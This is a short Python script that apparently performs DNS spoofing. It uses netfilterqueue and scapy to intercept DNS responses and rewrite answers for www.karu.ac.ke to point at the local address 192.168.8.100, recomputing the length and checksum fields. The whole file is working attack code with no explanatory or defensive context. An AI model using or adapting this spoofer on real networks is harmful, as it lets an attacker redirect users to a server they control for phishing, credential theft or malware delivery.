import netfilterqueue
import scapy.all as scapy



def processed_packet(packet):

    scapy_packet=scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):

        qname=scapy_packet[scapy.DNSQR].qname

        if "www.karu.ac.ke" in qname:


            print("[+] spoofing the target")

            answer=scapy.DNSRR(rrname=qname,rdata="192.168.8.100")


            scapy_packet[scapy.DNS].an=answer

            scapy_packet[scapy.DNS].ancount=1

            del scapy_packet[scapy.IP].len

            del scapy_packet[scapy.IP].chksum

            del scapy_packet[scapy.UDP].len

            del scapy_packet[scapy.UDP].chksum


            packet.set_payload(str(scapy_packet))

 

    packet.accept()

    


queue=netfilterqueue.NetfilterQueue()

queue.bind(0,processed_packet)

queue.run()